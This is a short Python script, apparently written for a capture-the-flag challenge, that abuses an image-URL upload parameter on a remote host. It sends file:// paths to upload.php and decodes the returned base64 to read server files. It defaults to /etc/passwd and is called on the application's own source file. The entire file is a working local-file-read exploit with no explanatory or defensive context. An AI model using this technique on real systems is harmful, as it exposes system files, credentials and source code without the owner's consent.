#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/06/13, 12:36
"""

import requests as req
import re
import base64

URL = 'http://a30d48dd3a6848adad52536ebc1d1ae6e3018ba271474b9e.changame.ichunqiu.com/'


def fuck(path='/etc/passwd'):
    data = {
        'picurl': 'file://'+path
    }
    res = req.post(URL+"upload.php", data)
    if res.status_code == 200:
        html = res.text
        m = re.findall(r'base64,(.*?)"', html)
        if m:
            print(base64.b64decode(m[0]))
        # print(html)


if __name__ == '__main__':
    fuck('/var/www/html/upload.php')
